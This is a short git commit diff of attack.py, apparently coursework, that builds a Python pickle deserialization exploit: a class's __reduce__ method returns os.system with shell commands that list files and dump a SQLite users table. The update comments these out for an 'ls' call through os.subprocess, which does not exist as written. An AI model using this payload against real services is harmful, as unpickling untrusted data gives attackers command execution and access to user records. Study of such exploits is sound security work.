4946e2e91c79f88c60f8c2f25f1e6caf928bdab3
apb <prie@itu.dk>
2021-04-18 15:03:32 +0200

    attack.py update

--- attack.py
+++ attack.py
@@ -5,9 +5,10 @@ import os
 
 class Test(object):
         def __reduce__(self):
-                cmd = ('ls ; sqlite test.db .tables ; sqlite test.db .schema users ; sqlite test.db "SELECT * FROM users"')
-                # cmd = ('whoami')
-                return os.system, (cmd,)
+            # cmd = ('ls ; sqlite test.db .tables ; sqlite test.db .schema users ; sqlite test.db "SELECT * FROM users"')
+            # cmd = ('whoami')
+            # return os.system, (cmd,)
+            return os.subprocess.check_output, ('ls',)
 
 
 a = pickle.dumps(Test())
